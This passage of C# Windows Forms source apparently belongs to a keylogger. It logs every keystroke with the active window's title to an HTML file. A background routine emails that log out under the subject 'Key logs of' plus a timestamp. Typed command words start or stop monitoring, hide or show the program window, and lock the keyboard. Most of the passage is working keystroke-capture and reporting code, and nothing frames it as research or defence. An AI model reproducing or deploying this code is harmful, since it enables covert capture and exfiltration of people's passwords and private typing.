                    Form existingForm = ( Form ) Application.OpenForms["display_pressed_key"];
                    foreach ( Control ctrl in existingForm.Controls )
                    {
                        if ( ctrl.Name == "label1" )
                        {
                            ctrl.Text = keypressed.ToString ( );
                        }
                    }

                }

            }
            if ( animateColorToolStripMenuItem.Checked )
                animate_on_key_pressed ( );
            
            ///[1]. getting ,displaying  and checking the app title
            string temp_app_name = label_app_title.Text;
            label_app_title.Text = ActiveAppTitle();
            //this.Text = ActiveAppTitle();
            if (temp_app_name == label_app_title.Text)
            {
                isWindowChange = false;
            }
            else
            {
                isWindowChange = true;
            }

            ///[2].  writing in the file
            writeinthefile(keypressed);
          

            ///displaying keystroked except SHIFT,CTRL andALT
            if (keypressed != Keys.LShiftKey && keypressed != Keys.RShiftKey && keypressed != Keys.LMenu && keypressed != Keys.RMenu && keypressed != Keys.LControlKey && keypressed != Keys.RControlKey)
            {
                ///writing new window name if iswindowchange is true
                ///
                if (isWindowChange == true)
                {
                    textBox_all_pressed_key.AppendText( "\r\n");                   
                    textBox_all_pressed_key.AppendText( ActiveAppTitle());
                    textBox_all_pressed_key.SelectionColor = Color.Red;
                    textBox_all_pressed_key.AppendText("\r\n");
                    try
                    {
                        if ( newwindowalert == true ) 
                        notifyIcon1.ShowBalloonTip ( 1, ActiveAppTitle ( ), "Keys are pressed in " + ActiveAppTitle ( ), ToolTipIcon.Info );
                    }
                    catch
                    {

                    }
                }

                if (keypressed == Keys.Space)
                {
                    textBox_all_pressed_key.AppendText(" ");
                }
                else if (keypressed == Keys.Enter || keypressed == Keys.Return)
                {
                    textBox_all_pressed_key.AppendText("\r\n");
                }
                else
                {
                    textBox_all_pressed_key.AppendText(keypressed.ToString());
                   
                }
            }
           

        }

        //email sender
        private void senderemail ( )
        {
           
            BackgroundWorker backgroundworker = new BackgroundWorker ( );
            backgroundworker.DoWork += new DoWorkEventHandler ( backgroundWorker_email_DoWork );
            backgroundworker.RunWorkerCompleted += new RunWorkerCompletedEventHandler ( backgroundworker_RunWorkerCompleted );
   
            try
            {
                backgroundworker.RunWorkerAsync ( );
            }
            catch
            {

            }
          
            clearRAM ( );
        }

        void backgroundworker_RunWorkerCompleted ( object sender, RunWorkerCompletedEventArgs e )
        {
          
            ( sender as BackgroundWorker ).Dispose ( );
            clearRAM ( );
            
        }


        private void backgroundWorker_email_DoWork ( object sender, DoWorkEventArgs e )
        {
            try
            {
                StreamReader reader = new StreamReader(savefilename);
                string body = reader.ReadToEnd();
                reader.Close();
                SendEmail.Email emails = new SendEmail.Email();
                emails.Send("....", "....", "....", "Key logs of " + DateTime.Now.Year + DateTime.Now.Month + DateTime.Now.Hour + DateTime.Now.Minute + DateTime.Now.Second, body);
            }
            catch
            {

            }
          
        }
        

        private void toogle_keys_settings(Keys tkeys)
        {
            //try
            //{
            //    if (tkeys == Keys.A)
            //    {

            //        SendKeys.Send("S");
              
            //    }
            //}
            //catch
            //{

            //}
        }
        /// <summary>
        /// Finds the active windows and returns its name
        /// </summary>
        /// <returns></returns>
        public static string ActiveAppTitle()
        {
            
          
            IntPtr hwnd = GetForegroundWindow();
            string outcome;
            if (hwnd.Equals(IntPtr.Zero))
            {
                outcome = "Desktop";
            }
            else
            {
                string str_ = new string('\0', 100);
                int windowText = GetWindowText(hwnd, str_, str_.Length);
                if (windowText <= 0 || windowText > str_.Length)
                {
                    outcome = "UnKnown Window";
                }
                else
                {
                    outcome = str_.Trim();
                }

            }
        
            return outcome;

        }
        /// <summary>
        /// guess words while typing
        /// </summary>
        private void guesswords()
        {

           
            foreach (ListViewItem item in listView_guess_words.Items)
            {

                if (item.Text == command)
                {
                    command = string.Empty;
                    try
                    {
                         SendKeys.Send((item.SubItems[1].Text));
                    }
                    catch
                    {

                    }

                }
             

            }

            clearRAM ( );
            
        }
        public void writeinthefile(Keys pressedkey)
        {

            clearRAM ( );
           
            if (startmonitoring == true)
            {
                if (isWindowChange == true)
                {
                    ///closing table
                    File.AppendAllText(savefilename, "</td>");
                    File.AppendAllText(savefilename, "</tr>");
                    File.AppendAllText(savefilename, "</table>");

                    ///saving apptitle name
                    File.AppendAllText(savefilename, "<br><hr><br>");
                    File.AppendAllText(savefilename, "<b><u><font color=\"BLUE\" size=4>" + ActiveAppTitle() + "</b></u></font>");
                    ///saving date
                    File.AppendAllText(savefilename, "<font color=\"RED\"> " + DateTime.Now.ToLongDateString() + "  " + DateTime.Now.ToLongTimeString() + " </font>");

                    ///creating table
                    File.AppendAllText(savefilename, "<table border=\"1\">");
                    File.AppendAllText(savefilename, "<tr>");
                    File.AppendAllText(savefilename, "<td>");

                }

                if (pressedkey == Keys.Enter || pressedkey == Keys.Return)
                {
                    DO_command_work(command, "Enter");
                    File.AppendAllText(savefilename, "<font color =\"MAGENTA\">" + "[ENTER]" + "</font>");
                    File.AppendAllText(savefilename, "<br></tr></td><tr><td>");

                }
                else if (pressedkey == Keys.Space)
                {
                    DO_command_work(command, "Space");
                    File.AppendAllText(savefilename, "&nbsp");
                }
                else if (pressedkey == Keys.Tab)
                {
                    DO_command_work(command, "Tab");
                    File.AppendAllText(savefilename, "<font color =\"PINK\">" + "[TAB]" + "</font>");
                }
                else if (pressedkey == Keys.LShiftKey || pressedkey == Keys.RShiftKey)
                {
                    DO_command_work(command, "Shift");
                    File.AppendAllText(savefilename, "<font color =\"CYAN\">" + "[SHIFT]" + "</font>");



                }
                else if (pressedkey == Keys.LMenu || pressedkey == Keys.RMenu || pressedkey == Keys.Menu)
                {
                    DO_command_work(command, "Alt");
                    File.AppendAllText(savefilename, "<font color =\"CYAN\">" + "[ALT]" + "</font>");
                }
                else if (pressedkey == Keys.LControlKey || pressedkey == Keys.RControlKey || pressedkey == Keys.Control || pressedkey == Keys.ControlKey)
                {
                    DO_command_work(command, "Control");
                    File.AppendAllText(savefilename, "<font color =\"CYAN\">" + "[CTRL]" + "</font>");
                }
                else if (pressedkey == Keys.Capital || pressedkey == Keys.CapsLock)
                {

                    File.AppendAllText(savefilename, "<font color =\"ORANGE\">" + "[CAPS LOCK]" + "</font>");
                }

                else if (pressedkey == Keys.NumLock)
                {
                    File.AppendAllText(savefilename, "<font color =\"ORANGE\">" + "[NUM LOCK]" + "</font>");

                }
                else if (pressedkey == Keys.Scroll)
                {
                    File.AppendAllText(savefilename, "<font color =\"ORANGE\">" + "[SCROLL LOCK]" + "</font>");

                }
                else if (pressedkey == Keys.Delete)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[DELETE]" + "</font>");

                }
                else if (pressedkey == Keys.Back)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[BACKSPACE]" + "</font>");
                    command = string.Empty;
                }
                else if (pressedkey == Keys.Home)
                {
                    File.AppendAllText(savefilename, "<font color =\"BLUE\">" + "[HOME]" + "</font>");

                }
                else if (pressedkey == Keys.PageUp || pressedkey == Keys.Prior)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[PAGE UP]" + "</font>");

                }
                else if (pressedkey == Keys.PageDown || pressedkey == Keys.Next)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[PAGE DOWN]" + "</font>");

                }
                else if (pressedkey == Keys.End)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[END]" + "</font>");

                }
                else if (pressedkey == Keys.Insert)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[INSERT]" + "</font>");

                }
                else if (pressedkey == Keys.Pause)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[PAUSE]" + "</font>");

                }
                else if (pressedkey == Keys.Cancel)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[BREAK]" + "</font>");
                }
                else if (pressedkey == Keys.PrintScreen || pressedkey == Keys.Snapshot)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[PRINT SCREEN]" + "</font>");
                }
                else if (pressedkey == Keys.Escape)
                {
                    DO_command_work(command, "Escape");
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGREEN\">" + "[ESCAPE]" + "</font>");
                }
                else if (pressedkey == Keys.Apps)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGREEN\">" + "[APPS KEY]" + "</font>");
                }
                else if (pressedkey == Keys.Down)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[DOWN ARROW]" + "</font>");
                }

                else if (pressedkey == Keys.Up)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[UP ARROW]" + "</font>");
                }

                else if (pressedkey == Keys.Right)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[RIGHT ARROW]" + "</font>");
                }
                else if (pressedkey == Keys.Left)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LEFT ARROW]" + "</font>");
                }

                else if (pressedkey == Keys.VolumeDown)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[VOLUME DOWN]" + "</font>");
                }
                else if (pressedkey == Keys.VolumeUp)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[VOLUME UP]" + "</font>");
                }
                else if (pressedkey == Keys.VolumeMute)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[VOLUME MUTE]" + "</font>");
                }
                else if (pressedkey == Keys.MediaNextTrack)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[MEDIA NEXT TRACK]" + "</font>");
                }
                else if (pressedkey == Keys.MediaPlayPause)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[MEDIA PLAY PAUSE]" + "</font>");
                }
                else if (pressedkey == Keys.MediaPreviousTrack)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[MEDIA PREVIOUS TRACK]" + "</font>");
                }
                else if (pressedkey == Keys.MediaStop)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[MEDIA STOP]" + "</font>");
                }

                else if (pressedkey == Keys.SelectMedia)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[SELECT MEDIA]" + "</font>");
                }
                else if (pressedkey == Keys.Clear)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[CLEAR]" + "</font>");
                }
                else if (pressedkey == Keys.Crsel)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[CRSEL]" + "</font>");
                }
                else if (pressedkey == Keys.Execute)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[EXECUTE]" + "</font>");
                }

                else if (pressedkey == Keys.Exsel)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[EXSEL]" + "</font>");
                }
                else if (pressedkey == Keys.Help)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[HELP]" + "</font>");
                }
                else if (pressedkey == Keys.LaunchApplication1)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LAUNCH APP]" + "</font>");
                }
                else if (pressedkey == Keys.LaunchApplication2)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LAUNCH APP]" + "</font>");
                }
                else if (pressedkey == Keys.LaunchMail)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LAUNCH MAIL]" + "</font>");
                }
                else if (pressedkey == Keys.LButton)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LEFT MOUSE]" + "</font>");
                }
                else if (pressedkey == Keys.LineFeed)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[LINE FEED]" + "</font>");
                }
                else if (pressedkey == Keys.LWin || pressedkey == Keys.RWin)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTBLUE\">" + "[WINDOW]" + "</font>");
                }
                else if (pressedkey == Keys.MButton)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[MIDDLE MOUSE]" + "</font>");
                }
                else if (pressedkey == Keys.Print)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[PRINT]" + "</font>");
                }
                else if (pressedkey == Keys.ProcessKey)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[PROCESS KEY]" + "</font>");
                }
                else if (pressedkey == Keys.RButton)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[RIGHT MOUSE]" + "</font>");
                }
                else if (pressedkey == Keys.Select)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[SELECT]" + "</font>");
                }
                else if (pressedkey == Keys.Sleep)
                {
                    File.AppendAllText(savefilename, "<font color =\"BLUE\">" + "[SLEEP]" + "</font>");
                }
                else if (pressedkey == Keys.XButton1)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[XBUTTON 1]" + "</font>");
                }
                else if (pressedkey == Keys.XButton2)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[XBUTTON 2]" + "</font>");
                }
                else if (pressedkey == Keys.Zoom)
                {
                    File.AppendAllText(savefilename, "<font color =\"LIGHTGRAY\">" + "[ZOOM]" + "</font>");
                }

                else if (pressedkey == Keys.NumPad0)
                {
                    File.AppendAllText(savefilename, "0");
                }

                else if (pressedkey == Keys.NumPad1)
                {
                    File.AppendAllText(savefilename, "1");
                }
                else if (pressedkey == Keys.NumPad2)
                {
                    File.AppendAllText(savefilename, "2");
                }
                else if (pressedkey == Keys.NumPad3)
                {
                    File.AppendAllText(savefilename, "3");
                }
                else if (pressedkey == Keys.NumPad4)
                {
                    File.AppendAllText(savefilename, "4");
                }
                else if (pressedkey == Keys.NumPad5)
                {
                    File.AppendAllText(savefilename, "5");
                }
                else if (pressedkey == Keys.NumPad6)
                {
                    File.AppendAllText(savefilename, "6");
                }
                else if (pressedkey == Keys.NumPad7)
                {
                    File.AppendAllText(savefilename, "7");
                }
                else if (pressedkey == Keys.NumPad8)
                {
                    File.AppendAllText(savefilename, "8");
                }
                else if (pressedkey == Keys.NumPad9)
                {
                    File.AppendAllText(savefilename, "9");
                }


                else if (pressedkey == Keys.F1)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F1]" + "</font>");
                }
                else if (pressedkey == Keys.F2)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F2]" + "</font>");
                }
                else if (pressedkey == Keys.F3)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F3]" + "</font>");
                }
                else if (pressedkey == Keys.F4)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F4]" + "</font>");
                }
                else if (pressedkey == Keys.F5)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F5]" + "</font>");
                }
                else if (pressedkey == Keys.F6)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F6]" + "</font>");
                }
                else if (pressedkey == Keys.F7)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F7]" + "</font>");
                }
                else if (pressedkey == Keys.F8)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F8]" + "</font>");
                }
                else if (pressedkey == Keys.F9)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F9]" + "</font>");
                }
                else if (pressedkey == Keys.F10)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F10]" + "</font>");
                }
                else if (pressedkey == Keys.F11)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F11]" + "</font>");
                }
                else if (pressedkey == Keys.F12)
                {
                    File.AppendAllText(savefilename, "<font color =\"RED\">" + "[F12]" + "</font>");
                }

                else if (pressedkey >= Keys.A && pressedkey <= Keys.Z)
                {
                    string key = pressedkey.ToString(); ;
                    if ((isShiftKeyHit == false && CapsLock==false) || (isShiftKeyHit==true && CapsLock==true) )            //if shift is off and caps is off
                    {
                        key = key.ToLower();
                    }
                    else if ((isShiftKeyHit == true && CapsLock==false) || (isShiftKeyHit==false && CapsLock==true))           ///if shift is on and caps is off
                    {
                        key = key.ToUpper();
                    }


                    ///adding keys in the command string (only A- Z)    
                    ///reset the command string null if enter is hit ( code is in HIT ENTER SECTION )-----see page up 
                    command += key;
                    textBox_command.Text = command;
                    textBox_command2.Text = command;

                    File.AppendAllText(savefilename, "<font color =\"BLUE\">" + key + "</font>");
                }


                if (isShiftKeyHit == true)
                {
                    if (pressedkey == Keys.Oem1)
                        File.AppendAllText(savefilename, ":");

                    else if (pressedkey == Keys.D0)
                        File.AppendAllText(savefilename, ")");

                    else if (pressedkey == Keys.D1)
                        File.AppendAllText(savefilename, "!");

                    else if (pressedkey == Keys.D2)
                        File.AppendAllText(savefilename, "@");
                    else if (pressedkey == Keys.D3)
                        File.AppendAllText(savefilename, "#");
                    else if (pressedkey == Keys.D4)
                        File.AppendAllText(savefilename, "$");
                    else if (pressedkey == Keys.D5)
                        File.AppendAllText(savefilename, "%");
                    else if (pressedkey == Keys.D6)
                        File.AppendAllText(savefilename, "^");
                    else if (pressedkey == Keys.D7)
                        File.AppendAllText(savefilename, "&");
                    else if (pressedkey == Keys.D8)
                        File.AppendAllText(savefilename, "*");
                    else if (pressedkey == Keys.D9)
                        File.AppendAllText(savefilename, "(");

                    else if (pressedkey == Keys.Oemtilde)
                        File.AppendAllText(savefilename, "~");
                    else if (pressedkey == Keys.OemMinus)
                        File.AppendAllText(savefilename, "_");
                    else if (pressedkey == Keys.Oemplus)
                        File.AppendAllText(savefilename, "+");
                    else if (pressedkey == Keys.Oem5)
                        File.AppendAllText(savefilename, "|");
                    else if (pressedkey == Keys.OemOpenBrackets)
                        File.AppendAllText(savefilename, "{");
                    else if (pressedkey == Keys.Oem6)
                        File.AppendAllText(savefilename, "}");
                    else if (pressedkey == Keys.OemPeriod)
                        File.AppendAllText(savefilename, ">");
                    else if (pressedkey == Keys.Oemcomma)
                        File.AppendAllText(savefilename, "<");
                    else if (pressedkey == Keys.OemQuestion)
                        File.AppendAllText(savefilename, "?");
                    else if (pressedkey == Keys.OemBackslash)
                        File.AppendAllText(savefilename, "?");
                    else if (pressedkey == Keys.Oem7)
                        File.AppendAllText(savefilename, "\"");
                }

                else
                {
                    if (pressedkey == Keys.Oem1)
                        File.AppendAllText(savefilename, ";");

                    else if (pressedkey == Keys.D0)
                        File.AppendAllText(savefilename, "0");

                    else if (pressedkey == Keys.D1)
                        File.AppendAllText(savefilename, "1");

                    else if (pressedkey == Keys.D2)
                        File.AppendAllText(savefilename, "2");
                    else if (pressedkey == Keys.D3)
                        File.AppendAllText(savefilename, "3");
                    else if (pressedkey == Keys.D4)
                        File.AppendAllText(savefilename, "4");
                    else if (pressedkey == Keys.D5)
                        File.AppendAllText(savefilename, "5");
                    else if (pressedkey == Keys.D6)
                        File.AppendAllText(savefilename, "6");
                    else if (pressedkey == Keys.D7)
                        File.AppendAllText(savefilename, "7");
                    else if (pressedkey == Keys.D8)
                        File.AppendAllText(savefilename, "8");
                    else if (pressedkey == Keys.D9)
                        File.AppendAllText(savefilename, "9");

                    else if (pressedkey == Keys.Oemtilde)
                        File.AppendAllText(savefilename, "`");
                    else if (pressedkey == Keys.OemMinus)
                        File.AppendAllText(savefilename, "-");
                    else if (pressedkey == Keys.Oemplus)
                        File.AppendAllText(savefilename, "=");
                    else if (pressedkey == Keys.Oem5)
                        File.AppendAllText(savefilename, @"\");
                    else if (pressedkey == Keys.OemOpenBrackets)
                        File.AppendAllText(savefilename, "[");
                    else if (pressedkey == Keys.Oem6)
                        File.AppendAllText(savefilename, "]");
                    else if (pressedkey == Keys.OemPeriod)
                        File.AppendAllText(savefilename, ".");
                    else if (pressedkey == Keys.Oemcomma)
                        File.AppendAllText(savefilename, ",");
                    else if (pressedkey == Keys.OemQuestion)
                        File.AppendAllText(savefilename, "/");
                    else if (pressedkey == Keys.Oem7)
                        File.AppendAllText(savefilename, "'");

                }

            }

            else              //if startmonitoring is false
            {
                if (pressedkey >= Keys.A && pressedkey <= Keys.Z)
                {
                    string key = pressedkey.ToString(); ;
                    if (isShiftKeyHit == false) // and caps is off )            //if shift is off and caps is off
                    {
                        key = key.ToLower();
                    }
                    else if (isShiftKeyHit == true) //and caps is off)           ///if shift is on and caps is off
                    {
                        key = key.ToUpper();
                    }


                    ///adding keys in the command string (only A- Z)    
                    ///reset the command string null if enter is hit ( code is in HIT ENTER SECTION )-----see page up 
                    command += key;
                    textBox_command.Text = command;
                    textBox_command2.Text = command;
               
                }
                else  if (pressedkey == Keys.Space ||pressedkey ==Keys.Enter ||pressedkey==Keys.Tab)
                {
                DO_command_work(command, do_work_keys);
                 
                }

            }
        }
        /// <summary>
        /// evaluating the command by the user after pressing ENTER key
        /// </summary>
        /// <param name="cmd"></param>
        private void DO_command_work(string cmd,string  senderkey)
        {
            clearRAM ( );
            if ( guess_keys == senderkey )
            {
                guesswords ( );
                command = null;
            }
            try
            {
            if (do_work_keys == senderkey)
            {
                //clearing the command string
                command = null;
                textBox_command.Text = null;
                textBox_command2.Text = null;
                
                
                #region start monitoring
                if (startmonitoring == false)
                {
                    if (listView_command.Items[0].SubItems[1].Text == cmd && listView_command.Items[0].SubItems[2].Text == "Enable")
                    {

                        //show_program_info(cmd, listView_command.Items[0].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            startmonitoring = true;
                            label_monitor_true_or_false.Text = startmonitoring.ToString();
                        }

                    }
                   else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[0].SubItems[1].Text) && listView_command.Items[0].SubItems[2].Text == "Enable")
                        {

                            //show_program_info(cmd, listView_command.Items[0].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                startmonitoring = true;
                                label_monitor_true_or_false.Text = startmonitoring.ToString();
                            }

                        }
                        startmonitoring = true;
                        label_monitor_true_or_false.Text = startmonitoring.ToString();
                    }
                }
#endregion

                   
                else if (startmonitoring == true)
                {
                    #region stop monitoring
                    if (listView_command.Items[1].SubItems[1].Text == cmd && listView_command.Items[1].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[1].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            startmonitoring = false;
                            label_monitor_true_or_false.Text = startmonitoring.ToString();
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[1].SubItems[1].Text) && listView_command.Items[1].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[1].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                startmonitoring = false;
                                label_monitor_true_or_false.Text = startmonitoring.ToString();
                            }

                        }
                    }
                    #endregion

                    #region exit program
                    if (listView_command.Items[2].SubItems[1].Text == cmd && listView_command.Items[2].SubItems[2].Text == "Enable")
                    {
                        Environment.Exit(1);
                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[2].SubItems[1].Text) && listView_command.Items[2].SubItems[2].Text == "Enable")
                        {
                            Environment.Exit(1);
                        }
                    }
#endregion

                    #region start new process
                    if (listView_command.Items[3].SubItems[1].Text == cmd && listView_command.Items[3].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[3].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            new_process obj = new new_process();
                            new_process.startnew_process = true;
                            obj.Show();
                            clearRAM ( );
                        }
                       

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {

                        if (cmd.Contains(listView_command.Items[3].SubItems[1].Text) && listView_command.Items[3].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[3].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                new_process obj = new new_process();
                                new_process.startnew_process = true;
                                obj.Show();
                                clearRAM();
                            }


                        }
                    }
                    #endregion

                    #region enable all commands
                    if (listView_command.Items[4].SubItems[1].Text == cmd)
                    {
                        //show_program_info(cmd, listView_command.Items[5].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            ///editing each listview item in the listview
                            ///editing the second subitem of each item in listview
                            foreach (ListViewItem itemtoedit in listView_command.Items)
                            {
                                if (itemtoedit.Text != "Enable All Commands")
                                    itemtoedit.SubItems[2].Text = "Enable";

                                save_all_system_commands_in_registry();
                            }
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if ( cmd.Contains(listView_command.Items[4].SubItems[1].Text))
                        {
                            //show_program_info(cmd, listView_command.Items[5].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                ///editing each listview item in the listview
                                ///editing the second subitem of each item in listview
                                foreach (ListViewItem itemtoedit in listView_command.Items)
                                {
                                    if (itemtoedit.Text != "Enable All Commands")
                                        itemtoedit.SubItems[2].Text = "Enable";

                                    save_all_system_commands_in_registry();
                                }
                            }

                        }
                    }
                    #endregion

                    #region disbale all commands
                    if (listView_command.Items[5].SubItems[1].Text == cmd && listView_command.Items[5].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[6].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            ///editing each listview item in the listview
                            ///editing the second subitem of each item in listview
                            foreach (ListViewItem itemtoedit in listView_command.Items)
                            {
                                if (itemtoedit.Text != "Enable All Commands")
                                    itemtoedit.SubItems[2].Text = "Disable";

                                save_all_system_commands_in_registry();
                            }
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if ( cmd.Contains(listView_command.Items[5].SubItems[1].Text) && listView_command.Items[5].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[6].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                ///editing each listview item in the listview
                                ///editing the second subitem of each item in listview
                                foreach (ListViewItem itemtoedit in listView_command.Items)
                                {
                                    if (itemtoedit.Text != "Enable All Commands")
                                        itemtoedit.SubItems[2].Text = "Disable";

                                    save_all_system_commands_in_registry();
                                }
                            }

                        }

                    }
                    #endregion

                    #region hiding the program
                    if (listView_command.Items[6].SubItems[1].Text == cmd && listView_command.Items[6].SubItems[2].Text == "Enable")
                    {
                        hideinfoform();
                        //show_program_info(cmd, listView_command.Items[7].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            this.Hide();
                            readwrite_registy.write ( "View", "Hide", "Yes" );
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[6].SubItems[1].Text) && listView_command.Items[6].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[7].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                this.Hide();
                                readwrite_registy.write("View", "Hide", "Yes");
                            }

                        }
                    }

                    #endregion

                    #region show the program
                    if (listView_command.Items[7].SubItems[1].Text == cmd && listView_command.Items[7].SubItems[2].Text == "Enable")
                    {

                        //show_program_info(cmd, listView_command.Items[8].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            this.Show();
                           
                            readwrite_registy.write ( "View", "Hide", "No" );
                        }


                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[7].SubItems[1].Text) && listView_command.Items[7].SubItems[2].Text == "Enable")
                        {

                            //show_program_info(cmd, listView_command.Items[8].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                this.Show();

                                readwrite_registy.write("View", "Hide", "No");
                            }


                        }
                    }

                    #endregion

                    #region lock the keyboard
                    if (listView_command.Items[8].SubItems[1].Text == cmd && listView_command.Items[8].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd,listView_command.Items[9].Text);
                        //if (Program_info.dontdothis == false)
                        {
                            checkBox_lock_keyboard.CheckState = CheckState.Checked;
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[8].SubItems[1].Text) && listView_command.Items[8].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd,listView_command.Items[9].Text);
                            //if (Program_info.dontdothis == false)
                            {
                                checkBox_lock_keyboard.CheckState = CheckState.Checked;
                            }

                        }
                    }
                    #endregion

                    #region unlock the keyboard
                    if (listView_command.Items[9].SubItems[1].Text == cmd && listView_command.Items[9].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[10].Text);

                        {
                            checkBox_lock_keyboard.CheckState = CheckState.Unchecked;
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if (cmd.Contains(listView_command.Items[9].SubItems[1].Text) && listView_command.Items[9].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[10].Text);

                            {
                                checkBox_lock_keyboard.CheckState = CheckState.Unchecked;
                            }

                        }
                    }
                    #endregion

                    #region display info
                    if (listView_command.Items[10].SubItems[1].Text == cmd && listView_command.Items[10].SubItems[2].Text == "Enable")
                    {
                        //show_program_info(cmd, listView_command.Items[10].Text);

                        {

                            info obj = new info();
                            obj.ShowDialog();
                            obj = null;
                            clearRAM ( );
                        }

                    }
                    else if (matchCommandToolStripMenuItem.Checked == false)
                    {
                        if ( cmd.Contains(listView_command.Items[10].SubItems[1].Text) && listView_command.Items[10].SubItems[2].Text == "Enable")
                        {
                            //show_program_info(cmd, listView_command.Items[10].Text);

                            {

                                info obj = new info();
                                obj.ShowDialog();
                                obj = null;
                                clearRAM();
                            }

                        }
                    }
